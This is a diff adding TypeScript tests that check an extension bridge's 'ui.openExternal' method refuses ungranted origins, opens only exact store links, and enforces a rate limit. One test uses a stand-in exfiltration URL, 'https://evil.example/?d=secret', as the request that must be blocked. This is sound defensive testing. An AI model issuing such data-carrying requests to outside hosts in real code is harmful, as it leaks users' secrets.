@@ -7,7 +7,7 @@ import { ApiError } from '../../../lib/api/envelope.types'
 import { createBridgeHost, type BridgeHost, type BridgeHostOptions } from './bridgeHost'
 import { BRIDGE_LIMITS, type BridgeOutbound, type BridgeResponse } from './bridgeProtocol'
 import type { BridgePolicy } from './policySnapshot'
-import { createRateLimiter } from './rateLimiter'
+import { createOpenExternalLimiter, createRateLimiter } from './rateLimiter'
 import { fakeBridgeDeps, type FakeBridgeDeps } from './testing/fakeBridgeDeps'
 import type { RegistryTimers } from './handlers/telemetryRegistry'
 
@@ -61,6 +61,7 @@ function harness(
     policy: { ...BASE, ...policy },
     settings: { refresh: 'hourly' },
     rateLimiter: createRateLimiter({ now: () => 0 }),
+    openExternalLimiter: createOpenExternalLimiter(() => 0),
     timers,
     ...extra,
     deps
@@ -294,6 +295,66 @@ describe('net.fetch (§6.5)', () => {
     expect(errorOf(await h.call('net.fetch', { url: 'https://api.octopart.com/' }))).toBe(
       'unavailable'
     )
+  })
+})
+
+describe('ui.openExternal (SEC-C1) — no unscoped exfiltration channel', () => {
+  const links = { storeLinks: ['https://docs.example.com/bom'] }
+
+  it('refuses an https URL whose origin is not granted, without opening anything', async () => {
+    const h = harness(links)
+    expect(
+      errorOf(await h.call('ui.openExternal', { url: 'https://evil.example/?d=secret' }))
+    ).toBe('network_denied')
+    expect(h.deps.ui.openExternal).not.toHaveBeenCalled()
+    expect(h.deps.emitRefusal).toHaveBeenCalledWith(
+      expect.objectContaining({ method: 'ui.openExternal', code: 'network_denied' })
+    )
+  })
+
+  it('opens a URL on a granted origin', async () => {
+    const h = harness(links)
+    const reply = await h.call('ui.openExternal', { url: 'https://api.octopart.com/part/1' })
+    expect(reply?.ok).toBe(true)
+    expect(h.deps.ui.openExternal).toHaveBeenCalledWith('https://api.octopart.com/part/1')
+  })
+
+  it('opens an exact store.links URL, but not a variation of it', async () => {
+    const h = harness(links)
+    expect((await h.call('ui.openExternal', { url: 'https://docs.example.com/bom' }))?.ok).toBe(
+      true
+    )
+    expect(
+      errorOf(await h.call('ui.openExternal', { url: 'https://docs.example.com/bom?x=1' }))
+    ).toBe('network_denied')
+    expect(h.deps.ui.openExternal).toHaveBeenCalledTimes(1)
+  })
+
+  it('an extension with no granted origins and no store links cannot open any URL', async () => {
+    const h = harness({ grantedNetwork: [], storeLinks: [] })
+    expect(errorOf(await h.call('ui.openExternal', { url: 'https://example.com/' }))).toBe(
+      'network_denied'
+    )
+    expect(h.deps.ui.openExternal).not.toHaveBeenCalled()
+  })
+
+  it('the 4th call within 60 s is rate_limited; the window then slides', async () => {
+    let t = 0
+    const h = harness(links, { openExternalLimiter: createOpenExternalLimiter(() => t) })
+    const url = 'https://api.octopart.com/'
+    for (let i = 0; i < BRIDGE_LIMITS.openExternalPerWindow; i++) {
+      expect((await h.call('ui.openExternal', { url }))?.ok).toBe(true)
+    }
+    expect(errorOf(await h.call('ui.openExternal', { url }))).toBe('rate_limited')
+    expect(h.deps.ui.openExternal).toHaveBeenCalledTimes(BRIDGE_LIMITS.openExternalPerWindow)
+    t = BRIDGE_LIMITS.openExternalWindowMs + 1
+    expect((await h.call('ui.openExternal', { url }))?.ok).toBe(true)
+  })
+
+  it('a refused URL does not consume the openExternal budget', async () => {
+    const h = harness(links, { openExternalLimiter: createOpenExternalLimiter(() => 0) })
+    for (let i = 0; i < 5; i++) await h.call('ui.openExternal', { url: 'https://evil.example/' })
+    expect((await h.call('ui.openExternal', { url: 'https://api.octopart.com/' }))?.ok).toBe(true)
   })
 })
 
